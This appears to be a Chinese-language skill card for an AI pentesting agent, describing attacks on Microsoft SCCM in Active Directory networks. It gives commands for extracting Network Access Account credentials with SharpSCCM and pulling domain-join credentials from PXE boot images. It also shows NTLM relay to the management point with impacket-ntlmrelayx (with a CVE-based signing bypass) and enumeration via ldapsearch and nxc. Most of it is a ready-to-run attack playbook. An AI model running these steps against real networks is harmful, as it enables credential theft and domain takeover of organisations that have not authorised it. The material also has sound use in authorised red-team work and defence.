---
name: 'sccm-attacks'
description: 'SCCM攻击：NAA提取+MP中继+PXE引导凭据。企业级AD环境关键攻击面。'
disable-model-invocation: true
metadata: { domain: ad-win, tier: T2 }
---
> 📌 DSH 用法：按卡名用 skill 工具加载；长任务用 bash 后台任务、并行侦察用 subagent。

## SCCM / Configuration Manager 攻击

### 识别
- SCCM 服务器通常在 `SMS_MP`、`SMS_DP`、`SMS_SUP` 等 AD 容器
- 客户端监听端口 10123
- 管理点 MP 默认 HTTPS 443

### 主要攻击路径

#### A: NAA (Network Access Account) 提取
```bash
# NAA 密码存储在 SCCM 客户端的 WMI 中（加密但可解密）
# 利用工具: SharpSCCM
SharpSCCM.exe get naa
# NAA 通常有域管理员级别的访问 OSD 部署共享
```text

#### B: PXE Boot Media 提取
```bash
# SCCM 的 PXE 启动镜像中嵌入域加入凭据
# 工具: SharpPXE 
SharpPXE.exe
# → 从 PXE 引导镜像提取 domain join 凭据
```text

#### C: MP 中继（NTLM Relay）
```bash
# SCCM Management Point 配 HTTP(NTLM) 且不强制签名时，把客户端机器账户的认证中继回 MP 本身
# 目标: MP 的 /ccm_system/request 端点 → 注册为受管设备(机器账户身份)
impacket-ntlmrelayx -t http://<MP_IP>/ccm_system/request -smb2support
# MP 强制签名 → 中继到其他服务(如 SMB) 或改用 CVE-2025-33073 --remove-sign-seal
```text

#### D: Client Push 账户
- SCCM 客户端推送安装账户是本地管理员
- 可以通过 SCCM 管理控制台获取

### 枚举
```bash
# LDAP 查询 SCCM 服务器
ldapsearch -H ldap://DC -b "CN=System Management,CN=System,DC=domain,DC=local"
# 客户端探测（有凭据时）
nxc smb <subnet> -u <user> -p <pass> -M sccm
```text

### 关键工具
- **SharpSCCM**: NAA 提取、站点枚举、DP 内容枚举
- **SharpPXE**: PXE 启动镜像凭据提取
- **pxethief**: 同样是 PXE 凭据提取
